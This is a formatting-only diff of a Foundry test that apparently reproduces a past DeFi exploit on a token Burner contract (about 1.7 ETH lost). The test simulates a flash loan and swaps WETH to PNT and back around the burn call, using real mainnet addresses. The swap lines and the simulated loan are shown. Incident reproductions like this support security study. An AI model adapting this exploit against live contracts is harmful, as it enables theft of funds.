@@ -3,17 +3,19 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 import "./../interface.sol";
-// @KeyInfo - Total Lost : 1.7eth 
+// @KeyInfo - Total Lost : 1.7eth
 // Attack Tx : https://etherscan.io/tx/0x3bba4fb6de00dd38df3ad68e51c19fe575a95a296e0632028f101c5199b6f714
 
 // @Info
 // https://x.com/0xNickLFranklin/status/1792925754243625311
 
-interface IBurner is IERC20{
-    function convertAndBurn(address [] calldata tokens) external;
+interface IBurner is IERC20 {
+    function convertAndBurn(
+        address[] calldata tokens
+    ) external;
 }
-contract ContractTest is Test {
 
+contract ContractTest is Test {
     IBurner burner_ = IBurner(0x4d4d05e1205e3A412ae1469C99e0d954113aa76F);
     IERC20 usdt_ = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
     IERC20 wbtc_ = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
@@ -28,7 +30,6 @@ contract ContractTest is Test {
     }
 
     function testExploit() public {
-
         vm.deal(address(this), 70 ether); //simulation flashloan
         weth_.deposit{value: 70 ether}();
         weth_.approve(address(router_), type(uint256).max);
@@ -38,11 +39,7 @@ contract ContractTest is Test {
         path[0] = address(weth_);
         path[1] = address(pnt_);
         router_.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            weth_.balanceOf(address(this)),
-            0,
-            path,
-            address(this),
-            block.timestamp
+            weth_.balanceOf(address(this)), 0, path, address(this), block.timestamp
         );
 
         console.log("=== ACK START ===");
@@ -56,11 +53,7 @@ contract ContractTest is Test {
         path[0] = address(pnt_);
         path[1] = address(weth_);
         router_.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            pnt_.balanceOf(address(this)),
-            0,
-            path,
-            address(this),
-            block.timestamp
+            pnt_.balanceOf(address(this)), 0, path, address(this), block.timestamp
         );
 
         weth_.transfer(address(0x01), 70 ether); // simulation repay flashloan
